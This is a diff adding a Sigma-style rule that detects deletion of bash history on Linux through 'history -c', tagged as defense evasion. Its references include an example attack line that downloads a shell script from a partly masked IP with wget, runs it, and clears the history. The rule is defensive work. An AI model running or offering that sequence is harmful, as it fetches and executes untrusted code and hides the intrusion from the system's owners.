@@ -1,0 +1,28 @@
+title: bash History Delete
+id: f840ea5e-a889-403c-a358-814e0f74ca27
+status: experimental
+description: Identifies events where the bash history is deleted through the built in method
+references:
+    - history -c
+    - wget http://45.14.165.xx/test.sh; sh test.sh; history -c
+tags:
+    - attack.defense_evasion
+    - attack.t1070.003
+author: exeron
+date: 2023/02/07 
+logsource:                      
+    category: process_creation  
+    product: linux            
+detection:
+    switch:
+        CommandLine|contains: 
+        - '-c'
+    history:
+        CommandLine|contains: 
+        - 'history'
+    condition: 1 of switch and 1 of history
+fields:
+    - process commandline
+falsepositives:
+    - Unknown, likely system admins, this is a common way to delete previous history which maybe due to clutter or to reset for a piece of work
+level: medium
